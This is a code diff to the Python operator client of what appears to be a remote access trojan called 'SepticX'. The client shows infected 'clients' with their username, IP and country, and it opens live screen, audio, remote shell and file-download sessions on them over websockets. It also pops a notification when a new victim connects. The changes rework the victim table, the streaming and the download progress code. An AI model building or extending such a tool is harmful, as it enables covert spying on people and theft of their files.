@@ -5,9 +5,10 @@ from PIL import Image, ImageTk
 from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
+from win10toast import ToastNotifier
 from cryptography.fernet import Fernet
 from websocket import create_connection
-import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, datetime, pyaudio, tkinter, shutil, base64, numpy as np, json, fade, math, time, glob, zlib, cv2, ssl, os, io
+import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, datetime, pyaudio, CTkTable, tkinter, shutil, base64, numpy as np, json, fade, math, time, glob, zlib, cv2, ssl, os, io
 
 customtkinter.set_appearance_mode("dark")
 
@@ -29,20 +30,23 @@ class Profile(customtkinter.CTkFrame):
             emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
 
             username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color="Black", corner_radius=0)
-            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+            username_widget.grid(row=0, column=1, columnspan=2, sticky="nsew", padx=1, pady=0)
 
             ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color="Black", corner_radius=0)
-            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+            ip_address_widget.grid(row=0, column=3, columnspan=2, sticky="nsew", padx=1, pady=0)
+
+            ip_address_widget = customtkinter.CTkButton(self, text="Status", fg_color="gray", text_color="Black", corner_radius=0)
+            ip_address_widget.grid(row=0, column=5, columnspan=1, sticky="nsew", padx=1, pady=0)
 
             address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color="Black", corner_radius=0)
-            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=1, pady=0)
             return
 
         username = config['username']
         ip_address = config['ip_address']
+        flag = config['flag']
 
-        ipinfo = requests.get(f"https://ipinfo.io/{config['ip_address']}/json").json()
-        response = requests.get(f"https://flagsapi.com/{ipinfo['country']}/flat/64.png")
+        response = requests.get(flag)
 
         img = Image.open(io.BytesIO(response.content))
         image = customtkinter.CTkImage(dark_image=img, light_image=img)
@@ -370,51 +374,39 @@ class Video(customtkinter.CTkToplevel):
         screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
 
         self.screen = screen
-        threading.Thread(target=self.get_display).start()
-        self.after(0, self.update_display)
+        ws = websocket.WebSocketApp(f"wss://{self.server_address}/api/ws/{self.endpoint}",
+                              on_open=self.on_open,
+                              on_message=self.on_message,
+                              on_error=self.kill_proc)
 
-    def update_display(self):
-        try:
-            self.image
-        except AttributeError:
-            self.after(50, self.update_display)
-            return
-        
-        image = customtkinter.CTkImage(dark_image=self.image, light_image=self.image, size=(self.winfo_width()*0.7, self.winfo_height()*0.7))
-        self.screen.configure(image=image, text="")
-        self.after(50, self.update_display)
+        threading.Thread(target=ws.run_forever).start()
 
-    def get_display(self):
-        while True:
-            try:
-                recv_data = ws.recv()
-                data = zlib.decompress(base64.b64decode(recv_data))
-            except (websocket.WebSocketException, ValueError, NameError) as e:
-                ws = self.connect()
-                continue
+    def on_open(self, ws):
+        ws.send(self.server_key)
+        ws.send(self.target)
 
-            self.image = Image.open(io.BytesIO(data))
+    def on_message(self, ws, recv_data):
+        image = Image.open(io.BytesIO(zlib.decompress(base64.b64decode(recv_data))))
 
-    def connect(self):
-        while True:
-            try:
-                ws = create_connection(f"wss://{self.server_address}/api/ws/{self.endpoint}")
-                ws.send(self.server_key)
-                ws.send(self.target)
-                return ws
-            except (websocket.WebSocketException, WindowsError):
-                pass
+        self.update_display(image)
 
     def kill_proc(self):
         command = self.endpoint.replace('show', 'stop').replace('Screen', 'Desktop')
-
-        self.ws.send(json.dumps({
-            "code": command,
-            "target": self.target
-        }))
+        
+        try:
+            self.ws.send(json.dumps({
+                "code": command,
+                "target": self.target
+            }))
+        except:
+            pass
 
         self.stop = True
         self.destroy()
+
+    def update_display(self, image):
+        image = customtkinter.CTkImage(dark_image=image, light_image=image, size=(self.winfo_width()*0.8, self.winfo_height()*0.8))
+        self.screen.configure(image=image, text="")
 
 
 class Audio(customtkinter.CTkToplevel):
@@ -494,10 +486,13 @@ class Audio(customtkinter.CTkToplevel):
                 pass
 
     def kill_proc(self):
-        self.ws.send(json.dumps({
-            "code": "stopAudio",
-            "target": self.target
-        }))
+        try:
+            self.ws.send(json.dumps({
+                "code": "stopAudio",
+                "target": self.target
+            }))
+        except:
+            pass
 
         self.stop = True
         self.destroy()
@@ -547,7 +542,10 @@ class Shell(customtkinter.CTkFrame):
     def kill_proc(self):
         self.stop = True
         self.destroy()
-        self.ws.close()
+        try:
+            self.ws.close()
+        except:
+            pass
 
     def read_command_outputs(self):
         while True:
@@ -722,7 +720,10 @@ class FileManager(customtkinter.CTkFrame):
     def kill_proc(self):
         self.stop = True
         self.destroy()
-        self.ws.close()
+        try:
+            self.ws.close()
+        except:
+            pass
 
     def connect(self):
         while True:
@@ -760,21 +761,33 @@ class FileManager(customtkinter.CTkFrame):
         file_size = list(file_size[:-6])
         del file_size[-4::-4]
         file_size = int(''.join(file_size))
+
+        print(file_size)
         
         chunk_size = 65536
         progress_bar = ProgressBar(transfer_type="Download")
 
-        count = 1
+
+        file_size = min(chunk_size, file_size) # Avoid division by zero
+        count = 0
 
         with open(filename, 'ab') as file:
             while True:
                 try:
                     data = ws.recv()
-                    count += 1
+                    
+                    print(count, data)
 
                     if data == "FIN":
-                        progress_bar.destroy()
-                        break
+                        if (count) > (file_size // chunk_size):
+                            print(data, chunk_size, count)
+                            progress_bar.destroy()
+                            break
+                        else:
+                            continue
+
+                    else:
+                        count += 1
 
                     try:
                         file.write(zlib.decompress(base64.b64decode(data)))
@@ -783,11 +796,14 @@ class FileManager(customtkinter.CTkFrame):
 
                     ws.send("ACK")
 
-                except (websocket.WebSocketException, WindowsError):
+                except (websocket.WebSocketException, WindowsError) as e:
+                    print(e)
                     progress_bar.destroy()
                     break
+
+                print(file_size, chunk_size, count)
                 
-                progress = min(file_size / (chunk_size * count), 1)
+                progress = min(count / (file_size // chunk_size), 1)
                 progress_bar.update(progress)
                 
         tkinter.messagebox.showinfo("SepticX Client", "Successfully downloaded file, check the downloads folder.")
@@ -932,11 +948,12 @@ class App(customtkinter.CTk):
 
         title = customtkinter.CTkLabel(self, image=image, text="")
         title.grid(row=0, column=0, columnspan=24, sticky="nsew")
+        self.toast = ToastNotifier()
 
         self.get_address()
 
     def get_address(self):
-        key_frame = customtkinter.CTkFrame(self)
+        key_frame = customtkinter.CTkFrame(self, corner_radius=15)
         key_frame.grid(row=1, column=6, padx=20, pady=20, sticky="nsew", columnspan=6, rowspan=18)
         
         for i in range(17): # Set 17 rows
@@ -956,6 +973,7 @@ class App(customtkinter.CTk):
 
         submit = customtkinter.CTkButton(
             key_frame, text='Submit', 
+            corner_radius=15, 
             command=lambda: self.connect_to_server(
                 server_address_entry.get(), 
                 server_key_entry.get(), 
@@ -978,10 +996,9 @@ class App(customtkinter.CTk):
             return
 
         ws.send(server_key)
-        time.sleep(1)
 
         try:
-            self.computers = json.loads(ws.recv())
+            self.computers = list(set(json.loads(ws.recv())))
         except (websocket.WebSocketException, ValueError, json.JSONDecodeError) as e:
             label.configure(text='Invalid Server Key')
             return
@@ -999,15 +1016,19 @@ class App(customtkinter.CTk):
         for child in self.winfo_children()[1:]:
             child.destroy()
 
+        print(1)
+
         threading.Thread(target=self.update_computers).start()
         self.menu()
+
+        print(2)
 
     def update_computers(self):
         ws = self.ws
 
         while True:
             try:
-                self.computers = json.loads(ws.recv())
+                self.computers = list(set(json.loads(ws.recv())))
             except json.JSONDecodeError:
                 pass
 
@@ -1031,21 +1052,91 @@ class App(customtkinter.CTk):
 
     def update_profiles(self, main_frame, computers=[]):
         if computers == self.computers:
-            self.after(10000, self.update_profiles, main_frame, computers)
+            self.after(1000, self.update_profiles, main_frame, computers)
             return
 
         computers = list(self.computers)
+        table_values = []
 
-        for child in main_frame.winfo_children()[1:]:
-            child.destroy()
+        profiles = json.load(open("computers.json", "r+"))
+        new_profiles = profiles + computers
 
-        for idx, computer in enumerate(self.computers):
+        offline_computers = [] # Load stored computers and assume they're offline
+        for idx, computer in enumerate(profiles):
+            if computer in computers: # If a computer is in the online list it can't be offline
+                continue
 
-            username, ip_address = computer.split('|')
-            config = {"username": username, "ip_address": ip_address}
-            Profile(master=main_frame, parent=self, config=config, row=idx + 1, rowspan=1, pady=1)
+            vals = computer.split('|')
 
+            username = vals[0]
+            ip_address = vals[1]
+
+            if len(vals) > 2:
+                version = vals[2]
+
+            else:
+                version = "Beta"
+
+            ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
+            country = ipinfo['country']
+
+            offline_computers.append([country, username, ip_address, "Offline", version, "More Options"])
+
+
+        online_computers = [] # Load connected computers and assume they're online
+        for idx, computer in enumerate(computers):
+            
+            vals = computer.split('|')
+
+            username = vals[0]
+            ip_address = vals[1]
+
+            if len(vals) > 2:
+                version = vals[2]
+
+            else:
+                version = "Beta"
+
+            ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
+            country = ipinfo['country']
+
+            if computer not in profiles:
+                threading.Thread(target=self.toast.show_toast, args=("SepticX", f"New client connected! {computer}")).start()
+
+            online_computers.append([country, username, ip_address, "Online", version, "More Options"])
+
+        table_values = [self.header] + online_computers + offline_computers # Put rows together
+
+        print(table_values)
+
+        with open("computers.json", "w+") as file:
+            file.write(json.dumps(
+                    list(set(new_profiles)),
+                    indent = 6
+                ))
+
+        self.table.configure(values=table_values)
         self.after(0, self.update_profiles, main_frame, computers)
+
+    def click(self, box):
+        column = box.get('column')
+        row = box.get('row')
+
+        username = self.table.get(row, 1)
+        ip_address = self.table.get(row, 2)
+
+        value = self.table.get(row, column)
+
+        if value == " ":
+            return
+
+        if column == len(self.header) - 1:
+            Controller(self, f"{username}|{ip_address}")
+
+        else:
+            self.clipboard_clear() 
+            self.clipboard_append(value)
+
 
     def menu(self):
         main_frame = customtkinter.CTkScrollableFrame(self, label_text="Clients")
@@ -1058,8 +1149,12 @@ class App(customtkinter.CTk):
 
         main_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
 
-        Profile(master=main_frame, title=True, pady=1)
+        self.header = ["Country", "Username", "Ip Address", "Status", "Version", "Control"]
+        self.table = CTkTable.CTkTable(master=main_frame, row=100, column=6, values=[self.header], corner_radius=15, header_color="gray", color_phase="horizontal", command=self.click)
+        self.table.grid(row=0, rowspan=1, column=0, columnspan=15, padx=5, pady=0, sticky="nsew")
 
+        # Profile(master=main_frame, title=True, pady=1)
+        
         self.after(0, self.update_profiles, main_frame)
 
     @staticmethod
@@ -1076,5 +1171,6 @@ class App(customtkinter.CTk):
         """))
 
 if __name__ == "__main__":
+
     app = App()
     app.mainloop()
